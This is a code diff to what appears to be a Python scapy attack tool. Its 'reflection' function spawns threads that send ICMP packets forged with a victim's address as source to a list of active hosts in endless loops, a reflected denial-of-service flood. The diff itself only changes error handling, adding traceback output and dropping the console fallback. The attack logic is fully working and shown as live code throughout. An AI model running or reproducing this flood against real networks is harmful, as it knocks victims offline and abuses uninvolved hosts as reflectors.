@@ -1,7 +1,8 @@
 from scapy.all import *
 import threading
+import traceback
 
-def reflection(victim,active_ips,terminal = None):
+def reflection(victim,active_ips,terminal):
 
     try:
         icmp_threads = []
@@ -22,22 +23,15 @@ def reflection(victim,active_ips,terminal = None):
         for t in icmp_threads:
             t.join()
     except Exception as s:
-        if terminal == None:
-            print(s)
-        else:
-            terminal.write('\n'+str(s))
+        terminal.write('\n'+str(s))
+        traceback.print_exc()
 
 def __send_spoofed_icmp(ip,victim,terminal):
     try:
-        if terminal == None:
-            print("[+] Sending packets to "+ip)
-        else:
-            terminal.write('\n[+] Sending packets to '+ip)
+        terminal.write('\n[+] Sending packets to '+ip)
         packet = IP(src=victim,dst=ip)/ICMP()
         while 1:
             send(packet,verbose = 0)
     except Exception as s:
-        if terminal == None:
-            print(s)
-        else:
-            terminal.write('\n'+str(s))
+        terminal.write('\n'+str(s))
+        traceback.print_exc()
